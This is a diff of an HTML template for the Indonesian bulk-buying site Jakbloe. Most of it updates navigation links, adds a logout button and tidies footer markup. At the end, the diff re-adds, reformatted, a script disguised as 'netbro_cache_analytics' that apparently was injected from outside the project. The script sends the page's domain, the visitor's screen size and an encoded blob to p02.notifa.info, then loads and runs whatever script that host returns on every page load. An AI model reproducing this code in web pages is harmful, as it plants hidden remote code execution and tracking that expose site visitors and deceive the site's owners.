@@ -29,7 +29,7 @@
         <header class="header_area">
             <nav class="navbar navbar-expand-lg menu_one menu_four">
                 <div class="container">
-                    <a class="navbar-brand sticky_logo" href="#"><img src="img/jakbloewhite1.png" srcset="img/logo2x-2.png 2x" alt="logo"><img src="img/jakbloecolor.png" srcset="img/logo2x.png 2x" alt=""></a>
+                    <a class="navbar-brand sticky_logo" href="/home"><img src="img/jakbloewhite1.png" srcset="img/logo2x-2.png 2x" alt="logo"><img src="img/jakbloecolor.png" srcset="img/logo2x.png 2x" alt=""></a>
                     <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                         <span class="menu_toggle">
                             <span class="hamburger">
@@ -51,11 +51,11 @@
                                     Home
                                 </a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="#">About Us</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="/about">About Us</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="#">Disclaimer</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="#">Privacy Policy</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
                             </li>
                             <li class="nav-item dropdown submenu">
                                 <a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
@@ -70,7 +70,8 @@
                             </li>
                         </ul>
                     </div>
-                    <a class="btn_get btn_hover btn_get_radious hidden-sm hidden-xs" href="#get-app">Masuk</a>
+                    <a class="btn_get btn_hover btn_get_radious hidden-sm hidden-xs" href="\login">Masuk</a>
+                    <a class="btn_get btn_hover btn_get_radious hidden-sm hidden-xs" href="#">Keluar</a>
                 </div>
             </nav>
         </header>
@@ -84,7 +85,9 @@
                         <div class="col-lg-4 col-sm-6">
                             <div class="f_widget company_widget">
                                 <a href="index.html" class="f-logo"><img src="img/jakbloewhite1.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
-                                <p class="mt_40">Jakbloe adalah sebuah website sebagai wadah untuk membeli barang secara massal. Sehingga harga barang yang didapatkan menjadi lebih murah. Ayo segera bergabung bersama kami!<br><h6 style="color:white;">Copyright © 2020 Jakbloe.com</h6></p>
+                                <p class="mt_40">Jakbloe adalah sebuah website sebagai wadah untuk membeli barang secara massal. Sehingga harga barang yang didapatkan menjadi lebih murah. Ayo segera bergabung bersama kami!<br>
+                                    <h6 style="color:white;">Copyright © 2020 Jakbloe.com</h6>
+                                </p>
                             </div>
                         </div>
                         <div class="col-lg-3 col-sm-6">
@@ -144,5 +147,32 @@
     <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
     <script src="js/plugins.js"></script>
     <script src="js/main.js"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVuZIvLpsPNiSU%2fnJJRnhzB6Ipwwp44T4y0zDMjKxalHo%2fdaB3VaNUwXynUTyP4AJfUg9bWYzX6K3HPQglHsjHedF%2f20QugqzJwDvbg%2bkuxfGf2%2bWWKoAWUCxGzWAR5TWy3NlUCZKtqRbYjdTQYfEW8C3utAqUs%2bUmhT1Uhw%2bsVRKVbZf%2fwa2FLQOhzv90tpMZuiO%2bAMf8G48%2bRKdCKdfn8XfbBwGRM8wXysmxYHBM4sOsI%2fEKuxOAmmzSSeAgr6I9QAYd%2byThx9igODgcswIwf%2fQToN4TCSm9kQvZDDTB8Fa%2fZqLxlq8z76x3lB%2bTGBvKAZ6gq59hH6FwCFIHqYherUgG551t63tFf5CmxuMk%2bhrWfJbO5CGzvLZUNwR5S5JyxftyMiV1xyEaOuxAUhAbJ5ovmnKRE09z1qye0ADM0uL1p7dGTUTQFcaVtj3MLAJkLzLLtq62gEPMAdc%2f4yYho0Fd7eoXj0OGgRLJzVoPpSM9QQwkWkkbG%2fzgIGylzIeh1q8TfIcXNmHg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVuZIvLpsPNiSU%2fnJJRnhzB6Ipwwp44T4y0zDMjKxalHo%2fdaB3VaNUwXynUTyP4AJfUg9bWYzX6K3HPQglHsjHedF%2f20QugqzJwDvbg%2bkuxfGf2%2bWWKoAWUCxGzWAR5TWy3NlUCZKtqRbYjdTQYfEW8C3utAqUs%2bUmhT1Uhw%2bsVRKVbZf%2fwa2FLQOhzv90tpMZuiO%2bAMf8G48%2bRKdCKdfn8XfbBwGRM8wXysmxYHBM4sOsI%2fEKuxOAmmzSSeAgr6I9QAYd%2byThx9igODgcswIwf%2fQToN4TCSm9kQvZDDTB8Fa%2fZqLxlq8z76x3lB%2bTGBvKAZ6gq59hH6FwCFIHqYherUgG551t63tFf5CmxuMk%2bhrWfJbO5CGzvLZUNwR5S5JyxftyMiV1xyEaOuxAUhAbJ5ovmnKRE09z1qye0ADM0uL1p7dGTUTQFcaVtj3MLAJkLzLLtq62gEPMAdc%2f4yYho0Fd7eoXj0OGgRLJzVoPpSM9QQwkWkkbG%2fzgIGylzIeh1q8TfIcXNmHg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
+    </script>
+</body>
+
 </html>
